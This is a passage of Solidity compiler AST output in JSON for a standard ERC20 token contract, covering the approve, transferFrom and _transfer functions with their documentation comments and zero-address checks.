            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1059
            ],
            "body": {
              "id": 644,
              "nodeType": "Block",
              "src": "4077:107:8",
              "statements": [
                {
                  "assignments": [
                    632
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 632,
                      "mutability": "mutable",
                      "name": "owner",
                      "nameLocation": "4095:5:8",
                      "nodeType": "VariableDeclaration",
                      "scope": 644,
                      "src": "4087:13:8",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 631,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "4087:7:8",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 635,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 633,
                      "name": "_msgSender",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 2977,
                      "src": "4103:10:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
                        "typeString": "function () view returns (address)"
                      }
                    },
                    "id": 634,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4103:12:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "4087:28:8"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 637,
                        "name": "owner",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 632,
                        "src": "4134:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 638,
                        "name": "spender",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 624,
                        "src": "4141:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 639,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 626,
                        "src": "4150:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 636,
                      "name": "_approve",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        885,
                        945
                      ],
                      "referencedDeclaration": 885,
                      "src": "4125:8:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 640,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4125:31:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 641,
                  "nodeType": "ExpressionStatement",
                  "src": "4125:31:8"
                },
                {
                  "expression": {
                    "hexValue": "74727565",
                    "id": 642,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "bool",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "4173:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "value": "true"
                  },
                  "functionReturnParameters": 630,
                  "id": 643,
                  "nodeType": "Return",
                  "src": "4166:11:8"
                }
              ]
            },
            "documentation": {
              "id": 622,
              "nodeType": "StructuredDocumentation",
              "src": "3697:296:8",
              "text": " @dev See {IERC20-approve}.\n NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n `transferFrom`. This is semantically equivalent to an infinite approval.\n Requirements:\n - `spender` cannot be the zero address."
            },
            "functionSelector": "095ea7b3",
            "id": 645,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "approve",
            "nameLocation": "4007:7:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 627,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 624,
                  "mutability": "mutable",
                  "name": "spender",
                  "nameLocation": "4023:7:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 645,
                  "src": "4015:15:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 623,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "4015:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 626,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "4040:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 645,
                  "src": "4032:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 625,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "4032:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "4014:32:8"
            },
            "returnParameters": {
              "id": 630,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 629,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 645,
                  "src": "4071:4:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 628,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "4071:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "4070:6:8"
            },
            "scope": 994,
            "src": "3998:186:8",
            "stateMutability": "nonpayable",
            "virtual": true,
            "visibility": "public"
          },
          {
            "baseFunctions": [
              1071
            ],
            "body": {
              "id": 676,
              "nodeType": "Block",
              "src": "4869:151:8",
              "statements": [
                {
                  "assignments": [
                    658
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 658,
                      "mutability": "mutable",
                      "name": "spender",
                      "nameLocation": "4887:7:8",
                      "nodeType": "VariableDeclaration",
                      "scope": 676,
                      "src": "4879:15:8",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      },
                      "typeName": {
                        "id": 657,
                        "name": "address",
                        "nodeType": "ElementaryTypeName",
                        "src": "4879:7:8",
                        "stateMutability": "nonpayable",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      "visibility": "internal"
                    }
                  ],
                  "id": 661,
                  "initialValue": {
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "id": 659,
                      "name": "_msgSender",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 2977,
                      "src": "4897:10:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_view$__$returns$_t_address_$",
                        "typeString": "function () view returns (address)"
                      }
                    },
                    "id": 660,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4897:12:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "4879:30:8"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 663,
                        "name": "from",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 648,
                        "src": "4935:4:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 664,
                        "name": "spender",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 658,
                        "src": "4941:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 665,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 652,
                        "src": "4950:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 662,
                      "name": "_spendAllowance",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 993,
                      "src": "4919:15:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 666,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4919:37:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 667,
                  "nodeType": "ExpressionStatement",
                  "src": "4919:37:8"
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 669,
                        "name": "from",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 648,
                        "src": "4976:4:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 670,
                        "name": "to",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 650,
                        "src": "4982:2:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 671,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 652,
                        "src": "4986:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 668,
                      "name": "_transfer",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 724,
                      "src": "4966:9:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 672,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "4966:26:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 673,
                  "nodeType": "ExpressionStatement",
                  "src": "4966:26:8"
                },
                {
                  "expression": {
                    "hexValue": "74727565",
                    "id": 674,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": true,
                    "kind": "bool",
                    "lValueRequested": false,
                    "nodeType": "Literal",
                    "src": "5009:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    },
                    "value": "true"
                  },
                  "functionReturnParameters": 656,
                  "id": 675,
                  "nodeType": "Return",
                  "src": "5002:11:8"
                }
              ]
            },
            "documentation": {
              "id": 646,
              "nodeType": "StructuredDocumentation",
              "src": "4190:581:8",
              "text": " @dev See {IERC20-transferFrom}.\n Skips emitting an {Approval} event indicating an allowance update. This is not\n required by the ERC. See {xref-ERC20-_approve-address-address-uint256-bool-}[_approve].\n NOTE: Does not update the allowance if the current allowance\n is the maximum `uint256`.\n Requirements:\n - `from` and `to` cannot be the zero address.\n - `from` must have a balance of at least `value`.\n - the caller must have allowance for ``from``'s tokens of at least\n `value`."
            },
            "functionSelector": "23b872dd",
            "id": 677,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "transferFrom",
            "nameLocation": "4785:12:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 653,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 648,
                  "mutability": "mutable",
                  "name": "from",
                  "nameLocation": "4806:4:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 677,
                  "src": "4798:12:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 647,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "4798:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 650,
                  "mutability": "mutable",
                  "name": "to",
                  "nameLocation": "4820:2:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 677,
                  "src": "4812:10:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 649,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "4812:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 652,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "4832:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 677,
                  "src": "4824:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
                    "id": 651,
                    "name": "uint256",
                    "nodeType": "ElementaryTypeName",
                    "src": "4824:7:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint256",
                      "typeString": "uint256"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "4797:41:8"
            },
            "returnParameters": {
              "id": 656,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 655,
                  "mutability": "mutable",
                  "name": "",
                  "nameLocation": "-1:-1:-1",
                  "nodeType": "VariableDeclaration",
                  "scope": 677,
                  "src": "4863:4:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 654,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "4863:4:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "visibility": "internal"
                }
              ],
              "src": "4862:6:8"
            },
            "scope": 994,
            "src": "4776:244:8",
            "stateMutability": "nonpayable",
            "virtual": true,
            "visibility": "public"
          },
          {
            "body": {
              "id": 723,
              "nodeType": "Block",
              "src": "5462:231:8",
              "statements": [
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 692,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 687,
                      "name": "from",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 680,
                      "src": "5476:4:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 690,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "5492:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 689,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "5484:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 688,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "5484:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 691,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "5484:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "5476:18:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 701,
                  "nodeType": "IfStatement",
                  "src": "5472:86:8",
                  "trueBody": {
                    "id": 700,
                    "nodeType": "Block",
                    "src": "5496:62:8",
                    "statements": [
                      {
                        "errorCall": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 696,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "5544:1:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "id": 695,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "5536:7:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 694,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "5536:7:8",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 697,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "5536:10:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 693,
                            "name": "ERC20InvalidSender",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 359,
                            "src": "5517:18:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_error_pure$_t_address_$returns$__$",
                              "typeString": "function (address) pure"
                            }
                          },
                          "id": 698,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "5517:30:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 699,
                        "nodeType": "RevertStatement",
                        "src": "5510:37:8"
                      }
                    ]
                  }
                },
                {
                  "condition": {
                    "commonType": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    },
                    "id": 707,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "id": 702,
                      "name": "to",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 682,
                      "src": "5571:2:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "arguments": [
                        {
                          "hexValue": "30",
                          "id": 705,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "5585:1:8",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          },
                          "value": "0"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_0_by_1",
                            "typeString": "int_const 0"
                          }
                        ],
                        "id": 704,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "5577:7:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_$",
                          "typeString": "type(address)"
                        },
                        "typeName": {
                          "id": 703,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "5577:7:8",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 706,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "nameLocations": [],
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "5577:10:8",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "src": "5571:16:8",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "id": 716,
                  "nodeType": "IfStatement",
                  "src": "5567:86:8",
                  "trueBody": {
                    "id": 715,
                    "nodeType": "Block",
                    "src": "5589:64:8",
                    "statements": [
                      {
                        "errorCall": {
                          "arguments": [
                            {
                              "arguments": [
                                {
                                  "hexValue": "30",
                                  "id": 711,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": true,
                                  "kind": "number",
                                  "lValueRequested": false,
                                  "nodeType": "Literal",
                                  "src": "5639:1:8",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  },
                                  "value": "0"
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_rational_0_by_1",
                                    "typeString": "int_const 0"
                                  }
                                ],
                                "id": 710,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": true,
                                "lValueRequested": false,
                                "nodeType": "ElementaryTypeNameExpression",
                                "src": "5631:7:8",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_type$_t_address_$",
                                  "typeString": "type(address)"
                                },
                                "typeName": {
                                  "id": 709,
                                  "name": "address",
                                  "nodeType": "ElementaryTypeName",
                                  "src": "5631:7:8",
                                  "typeDescriptions": {}
                                }
                              },
                              "id": 712,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": true,
                              "kind": "typeConversion",
                              "lValueRequested": false,
                              "nameLocations": [],
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "5631:10:8",
                              "tryCall": false,
                              "typeDescriptions": {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_address",
                                "typeString": "address"
                              }
                            ],
                            "id": 708,
                            "name": "ERC20InvalidReceiver",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 364,
                            "src": "5610:20:8",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_error_pure$_t_address_$returns$__$",
                              "typeString": "function (address) pure"
                            }
                          },
                          "id": 713,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "nameLocations": [],
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "5610:32:8",
                          "tryCall": false,
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 714,
                        "nodeType": "RevertStatement",
                        "src": "5603:39:8"
                      }
                    ]
                  }
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "id": 718,
                        "name": "from",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 680,
                        "src": "5670:4:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 719,
                        "name": "to",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 682,
                        "src": "5676:2:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        }
                      },
                      {
                        "id": 720,
                        "name": "value",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 684,
                        "src": "5680:5:8",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        }
                      ],
                      "id": 717,
                      "name": "_update",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 801,
                      "src": "5662:7:8",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
                        "typeString": "function (address,address,uint256)"
                      }
                    },
                    "id": 721,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "nameLocations": [],
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "5662:24:8",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 722,
                  "nodeType": "ExpressionStatement",
                  "src": "5662:24:8"
                }
              ]
            },
            "documentation": {
              "id": 678,
              "nodeType": "StructuredDocumentation",
              "src": "5026:362:8",
              "text": " @dev Moves a `value` amount of tokens from `from` to `to`.\n This internal function is equivalent to {transfer}, and can be used to\n e.g. implement automatic token fees, slashing mechanisms, etc.\n Emits a {Transfer} event.\n NOTE: This function is not virtual, {_update} should be overridden instead."
            },
            "id": 724,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "_transfer",
            "nameLocation": "5402:9:8",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 685,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 680,
                  "mutability": "mutable",
                  "name": "from",
                  "nameLocation": "5420:4:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 724,
                  "src": "5412:12:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 679,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "5412:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 682,
                  "mutability": "mutable",
                  "name": "to",
                  "nameLocation": "5434:2:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 724,
                  "src": "5426:10:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 681,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "5426:7:8",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "visibility": "internal"
                },
                {
                  "constant": false,
                  "id": 684,
                  "mutability": "mutable",
                  "name": "value",
                  "nameLocation": "5446:5:8",
                  "nodeType": "VariableDeclaration",
                  "scope": 724,
                  "src": "5438:13:8",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint256",
                    "typeString": "uint256"
                  },
                  "typeName": {
